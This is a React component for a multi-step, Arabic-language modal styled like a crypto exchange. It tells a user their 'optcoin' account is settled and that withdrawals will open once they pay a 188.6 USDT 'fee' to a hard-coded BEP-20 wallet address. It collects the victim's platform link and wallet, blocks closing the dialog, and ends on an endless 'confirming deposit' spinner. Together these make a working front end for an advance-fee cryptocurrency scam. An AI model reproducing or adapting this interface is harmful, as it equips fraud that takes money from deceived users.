
import React, { useState } from 'react';

interface MultiStepModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const MultiStepModal: React.FC<MultiStepModalProps> = ({ isOpen }) => {
  const [step, setStep] = useState(1);
  const [formData, setFormData] = useState({
    platformLink: '',
    bep20Address: ''
  });

  if (!isOpen) return null;

  const handleNext = () => setStep(step + 1);

  const renderStep = () => {
    switch (step) {
      case 1:
        return (
          <div className="space-y-4">
            <p className="text-[15px] leading-relaxed text-right">
              أهلاً بك <span className="text-[#f0b90b] font-bold">A5VSVP5CH000</span> تم تسوية حسابك <span className="font-bold">optcoin</span> وسيتم فتح قناة السحب. 
              اتبع التعليمات وقم بوضع رابط المنصة <span className="text-[#f0b90b]">mini pro</span> لقسم الإيداع حصراً.
            </p>
            <input
              type="text"
              placeholder="رابط المنصة mini pro"
              className="w-full bg-[#2b2f36] border border-[#474d57] rounded-lg p-3 text-sm focus:border-[#f0b90b] outline-none transition-colors text-right"
              value={formData.platformLink}
              onChange={(e) => setFormData({ ...formData, platformLink: e.target.value })}
            />
            <button
              onClick={handleNext}
              disabled={!formData.platformLink}
              className="w-full bg-[#f0b90b] text-black font-bold py-3 rounded-lg hover:bg-[#e2ad0a] transition-colors disabled:opacity-50"
            >
              التالي
            </button>
          </div>
        );
      case 2:
        return (
          <div className="space-y-4">
            <p className="text-[15px] text-right">يرجى إدخال عنوان محفظة BEP-20 الخاصة بك:</p>
            <input
              type="text"
              placeholder="رابط محفظة BEP-20"
              className="w-full bg-[#2b2f36] border border-[#474d57] rounded-lg p-3 text-sm focus:border-[#f0b90b] outline-none transition-colors text-right"
              value={formData.bep20Address}
              onChange={(e) => setFormData({ ...formData, bep20Address: e.target.value })}
            />
            <button
              onClick={handleNext}
              disabled={!formData.bep20Address}
              className="w-full bg-[#f0b90b] text-black font-bold py-3 rounded-lg hover:bg-[#e2ad0a] transition-colors disabled:opacity-50"
            >
              التالي
            </button>
          </div>
        );
      case 3:
        return (
          <div className="space-y-4">
            <p className="text-[14px] leading-relaxed text-right">
              أهلاً بك <span className="text-[#f0b90b] font-bold">A5VSVP5CH000</span> بقي أمر إيداع مبلغ <span className="font-bold text-[#f0b90b]">188.6 USDT (BEP-20)</span> لفتح قناة السحب.
            </p>
            <p className="text-[12px] text-[#848e9c] text-right bg-[#1e2329] p-3 rounded border border-[#2b2f36]">
              هذه الضريبة هي أجور منصتنا وليس لها أي صلة بمنصة mini pro.
            </p>
            <div className="bg-[#0b0e11] p-3 rounded-lg border border-[#f0b90b]/30 break-all">
              <p className="text-[11px] text-[#848e9c] mb-1 text-right">عنوان المحفظة للتحويل:</p>
              <p className="text-[13px] font-mono text-center text-[#f0b90b] select-all">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</p>
            </div>
            <button
              onClick={handleNext}
              className="w-full bg-[#f0b90b] text-black font-bold py-3 rounded-lg hover:bg-[#e2ad0a] transition-colors"
            >
              تم الإيداع
            </button>
          </div>
        );
      case 4:
        return (
          <div className="py-8 flex flex-col items-center space-y-4">
            <div className="w-12 h-12 border-4 border-[#f0b90b] border-t-transparent rounded-full animate-spin"></div>
            <p className="text-[16px] font-bold text-center">الرجاء الانتظار للتأكد من عملية الإيداع</p>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className="fixed inset-0 z-[200] flex items-center justify-center p-6">
      {/* خلفية معتمة خفيفة بدون إمكانية إغلاق */}
      <div className="absolute inset-0 bg-black/50 backdrop-blur-[1px]"></div>
      
      {/* نافذة الحوار */}
      <div className="relative w-full max-w-[340px] bg-[#1e2329] border border-[#2b2f36] rounded-2xl p-6 shadow-2xl text-white">
        {renderStep()}
      </div>
    </div>
  );
};

export default MultiStepModal;
